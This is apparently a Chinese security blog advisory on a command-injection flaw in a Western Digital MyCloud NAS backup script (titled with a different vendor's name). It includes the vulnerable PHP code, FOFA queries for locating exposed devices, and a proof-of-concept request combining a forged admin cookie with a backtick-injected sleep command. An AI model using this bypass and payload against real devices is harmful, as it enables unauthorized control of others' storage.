---
title: "西部数码 NAS php/remoteBackups.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-remoteBackups-rce.html
asset_dir: assets/西部数码-nas-phpremotebackups.php-命令执行漏洞
---

# 西部数码 NAS php/remoteBackups.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/4 15:37
- 732浏览
- [0评论](#comment)
- 17分钟阅读

深入探索

安全工具开发

云安全解决方案

Web安全书籍

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS remoteBackups.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `remoteBackups.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$date = new DateTime();
$r= $date->getTimestamp();

$cmd = $_REQUEST['cmd'];
$RemoteBackupsAPI = new RemoteBackupsAPI;

switch ($cmd) {
    case "getRecoverItems":
       $RemoteBackupsAPI->getRecoverItems();
       break;
}

class RemoteBackupsAPI{
    public function getRecoverItems()
    {
       $xmlPath = "/var/www/xml/rsync_recover_items.xml";
       $jobName = $_REQUEST['jobName'];

       @unlink($xmlPath);

       $cmd = "rsyncmd -l \"$xmlPath\" -r \"$jobName\" >/dev/null";
       system($cmd);

       if (file_exists($xmlPath))
       {
          print file_get_contents($xmlPath);
       }
       else
       {
          print "<config></config>";
       }
    }
}
?>
```

当**cmd=getRecoverItems**时，从请求中获取 `jobName` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 **$cmd**中，然后用`system()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞预警服务

# 漏洞复现

```
GET /web/php/remoteBackups.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin

cmd=getRecoverItems&jobName=\"`sleep 3`\"
```

[![西部数码 NAS php/remoteBackups.php 命令执行漏洞](images/img-001-a50b4c2cc2b5.webp)](https://image.mrxn.net/a95d012ed6f8485999855e9109010e61.webp)

成功延时 3 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
